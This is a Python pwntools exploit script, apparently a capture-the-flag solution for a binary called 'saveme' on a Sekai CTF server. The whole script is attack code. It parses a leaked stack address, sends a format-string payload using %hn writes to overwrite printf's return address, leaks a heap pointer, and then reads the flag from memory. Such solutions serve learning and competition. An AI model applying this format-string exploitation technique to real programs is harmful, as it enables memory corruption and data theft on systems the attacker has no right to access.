from pwn import *

p = remote('challs.ctf.sekai.team', 4001)
#p = process('./saveme')

p.sendline(b'2')
p.recvuntil(b'gift: 0x')
buf_addr = unpack(unhex(p.recvuntil(b'|', drop=True).strip()), word_size=48, endian='big')
printf_ret = buf_addr - 0x18

payload = b'%5369p'
payload += b'%11$hn'
payload += b'%12$s'

payload += b'\x00'*(8-(len(payload)%8)) + p64(printf_ret) + p64(buf_addr-0xd0)

p.sendline(payload)
p.recvuntil(b'0xa')
heap_addr = p.recv().strip()
print(heap_addr)
flag_addr = unpack(heap_addr, 'all', endian='little') - 0xc00

p.sendline(b'%9$s\x00\x00\x00\x00' + p64(flag_addr))
print(p.recvall().decode('utf-8'))
